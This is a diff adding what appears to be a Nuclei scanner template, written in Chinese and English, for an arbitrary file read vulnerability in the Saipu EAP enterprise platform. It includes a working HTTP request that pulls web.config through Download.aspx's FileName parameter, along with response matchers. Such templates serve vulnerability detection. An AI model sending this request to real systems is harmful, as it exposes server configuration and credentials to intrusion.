@@ -1,0 +1,34 @@
+id: saipu-eap-fileread
+
+info:
+  name: 赛普EAP企业适配管理平台Download.aspx任意文件读取
+  author: qwtd
+  severity: high
+  description: 赛普EAP企业适配管理平台Download.aspx任意文件读取漏洞，攻击者可利用该漏洞读取任意文件。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E8%B5%9B%E6%99%AE/%E8%B5%9B%E6%99%AEEAP%E4%BC%81%E4%B8%9A%E9%80%82%E9%85%8D%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0Download.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+  tags: 赛普EAP
+
+http:
+  - raw:
+      - |
+        GET /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36
+        Content-Type:application/x-www-form-urlencoded
+        Accept: */*
+        Connection: Keep-Alive
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "configuration"
+          - "configSections"
+          - "appSettings"
+        condition: and
+      - type: status
+        status:
+          - 200
